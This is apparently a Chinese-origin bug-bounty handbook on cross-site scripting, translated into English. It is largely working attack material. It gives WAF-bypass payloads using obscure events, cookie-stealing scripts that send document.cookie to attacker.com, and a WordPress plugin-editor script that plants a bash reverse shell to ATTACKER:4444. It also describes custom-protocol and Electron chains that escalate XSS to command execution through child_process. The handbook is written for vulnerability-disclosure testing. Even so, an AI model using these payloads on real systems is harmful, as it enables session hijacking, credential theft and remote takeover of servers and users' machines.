> Search quick-hits by heading for "XSS → RCE" and "custom protocol → RCE". The English attachments / polyglot wiki have been cut; obscure events and privileged contexts remain.
> **The payloads below are only accelerators, not a checklist.** On site, pick and adapt your own by context; encodings/events/tags not in the table are fair game too. Do not just cycle through the few rows collected in this section.

## 1. Original Knowledge Base

# XSS Testing Handbook

## XSS Type Identification

| Type | Characteristic |
|------|------|
| Stored | payload is saved to the database and triggers when others visit |
| Reflected | payload sits in the URL parameter and needs to be clicked |
| DOM | processed purely client-side, never reaching the server |

When you land something, rate it per `../rules/report-format.md`; don't inflate the severity because it's stored/reflected/DOM.

---

## Common Injection Points

```
Search box → search results page
Comments/message boards
Profile fields (nickname, signature, bio)
Filename (shown after upload)
404/error pages (display URL parameters)
Notification content
Customer-service chat
Rich-text editors
README / Wiki / issues / MR descriptions on Git or docs sites (test both the web and desktop clients; see §8 XSS→RCE)
Desktop-client custom protocols (scheme params carrying url / open / openUrl / webview; see §8 custom protocol → RCE)
Redirect-back params backUrl / returnUrl / redirect / next (javascript: or javascript%3A + document.write(document.cookie))
Rich text / BBCode / wiki (attributes survive when `[p]` `[[p]]` `[div]` become HTML; if the page ships Layui/animate.css, hang an existing animation class + onanimationstart)
```

---

## Basic Payloads

```html
<!-- Basic verification -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- No script tag -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- Attribute injection (closing an attribute) -->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF Bypass Payloads

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- Event variety -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Obscure automatic events: for when onerror/onload are stripped. Unknown tags work too. In inline scope, cookie is document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- When unknown tags are stripped, switch to input; content-visibility:auto alone suffices, no display:block needed -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover: switch to this when style is stripped. Needs one button click. Inline URL is document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- Comment splitting -->
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>

<!-- Using backticks -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie-Stealing Payloads

```html
<!-- Send the Cookie to the attacker's server -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch version (more reliable) -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC proof (no real receiver needed; dnslog is enough) -->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## DOM XSS Hunting

```javascript
// Search dangerous sinks
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// Common DOM XSS sources
document.location.hash    // content after #
document.location.search  // params after ?
document.referrer
window.name
postMessage
```

---

## XSS Proof (SRC Requirements)

For SRC submissions, **using alert(1) as proof is forbidden**; use instead:

```javascript
// Prove you can read the Cookie
alert(document.cookie)
// In inline events you can write a=alert,a(cookie) or a=alert,a(URL) (the scope is document.cookie / document.URL)

// Prove you can read the token (localStorage)
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// Prove the domain (proves it's not self-xss)
alert(document.domain)
```

---

### Obscure Events + Inline Scope (when onerror/onload are blocked)

Tag names are arbitrary (unknown elements like `c2xh` / `c2xl` work). Inline-event scope reaches `document`: `cookie` = `document.cookie`, `URL` = `document.URL`. When `document` / `alert(1)` are blocked, use `a=alert,a(cookie)` or `a=alert,a(URL)`.

No click needed (when `style` is still present):

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

If unknown tags are stripped, switch to `input` / `p` (or another allowlisted tag). On `input`, `content-visibility:auto` alone usually suffices; no need to also write `display:block`. If `alert(1)` passes, run with it; if it's blocked, switch to `a=alert,a(cookie)`.

If the rich text / BBCode / wiki converts `[p]`, `[[p]]`, `[div]` into the corresponding HTML and carries attributes through verbatim, hang the event directly on an allowed tag:

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` needs a click/mouse move; `position:fixed` covering the whole page means it fires as soon as the mouse moves. `eval.call\`...\`` calls `eval` via a tagged template; `\x65` is `e`, dodging a literal `alert`. If an automatic event passes, don't use this one.

When `onerror`/`onload` are stripped and automatic events don't fire either, switch to a pointer event + inflate the element so it fires the moment the mouse enters (URL-encoded form commonly seen):

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

Decoded, that is `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`. The trailing `//` comments out whatever follows the injection point. Dead ends: the victim never enters this oversized svg; the tag/event is stripped.

When the page already ships ready-made animations like Layui / animate.css, use a class from the library with `onanimationstart` to fire automatically, no need to write your own `@keyframes`:

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

When the event handler writes `javascript:alert(1)`, `javascript:` is a JS label and the following `alert(1)` still runs — it's not a URL scheme. Dead ends: the page doesn't have that CSS; the class/event is stripped; the animation never plays.

Dead ends: only the tag name changes but attributes are stripped; output is plain text; no mouse move; `style` stripped leaving only a small block requiring precise hover; CSP forbids `eval`. Earlier lines like "Life: face" are just prose, not part of the payload.

When `style` / `content-visibility` are stripped, switch to Popover, which needs one button click. `popovertarget` points to the `id`; `onbeforetoggle` fires before the popover opens:

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Chrome / Edge preferred. Firefox and Safari often ignore these two APIs; switch to another event — this one isn't a dead end. The Popover row doesn't count as landed unless the button is clicked.

## 8. XSS → RCE / Custom Protocol (pointer in quick-hits)

### XSS → RCE (privileged context; the escalation of the same chain that steals cookies above)

Once a stored/reflected XSS lands, or Electron itself pulls an off-site page into a privileged window, the question is: **in whose process is this JS running**. In a web page it's just a session; only when it lands somewhere that can write plugins or call a local bridge does it become RCE. The rows below are the same category, not mutually exclusive.

**Web admin backend (WordPress etc.)**: admin session + an editor that can modify plugins/themes. Hello Dolly is just a ready-made file; any other writable entry point works the same.

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**Desktop client (CEF / Electron / enterprise Git GUI)**: with a node bridge / `nodeIntegration` / `enableRemoteModule` / exposed `Buffer`·`require`·`child_process`, the page's JS runs inside the local process. Pick the payload by the site (auto-redirect, external link, event, remote page) — **don't blindly copy a single gadget**. If the sandbox kills it → keep attacking the web side as a plain stored XSS; don't declare this one dead.

Delivery 1 (stored XSS): HTML stored in READMEs, issues, and comments is rendered by the client as a web page. If the member/invite API only accepts numeric `user_id`, just pull in increasing IDs (that's the sequential ID + bulk write already in `idor-test.md`). If the victim's clone list isn't isolated, your repo appears in their client, and opening the README triggers it. Pulling in users isn't the core of the bug — the core is still that the client rendered the HTML as privileged XSS.

### Custom Protocol → RCE (pointer in quick-hits)

Delivery 2 (custom protocol; no stored XSS needed first): the client registers its own scheme. On macOS look at `CFBundleURLSchemes` in `Info.plist`; on Windows look at the protocol written during install; in the bundled JS search for `setAsDefaultProtocolClient` / `open-url` / `second-instance`. If the protocol params contain `url`, `urlType`, `open`, `openUrl`, `webview`, try stuffing an off-site address into them. Two common shapes (follow the field names on site, don't blindly copy):

- JSON: `scheme://app/open?params={"url":"http://attacker","urlType":1}`
- Flat: `scheme://openUrl?url=http://attacker/exp.html`

Opening it from the browser address bar or any `href` makes the system ask "Do you want to open this app?" — one click from the victim counts as reasonable interaction; no man-in-the-middle needed.

The attack page first probes the bridge, then pops the calculator. Don't stop because it's Electron 18+ or there's no `remote`. Order: `typeof process` → `typeof require` (only trust it if `require.toString()` contains `native`) → `window.require` → if none, check the preload bridge / `window.electron.ipcRenderer`. If `require` can reach `child_process` directly, use it; only legacy windows go through:

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

On Windows swap the command for `calc`. If the preload only exposes `ipcRenderer` and can't call commands → this bridge isn't broken; don't write it up as RCE.

Counts as success: the calculator pops on the local machine / your specified harmless command executes. If it only alerts in the browser, the client doesn't render it, it only pops "Open app" without loading the off-site page, or it navigates without executing → stop at invocation/stored XSS; don't write it up as RCE. If the protocol only opens its own domain and there's neither `require` nor `remote` → this delivery is done; switch to Delivery 1 or the web page.
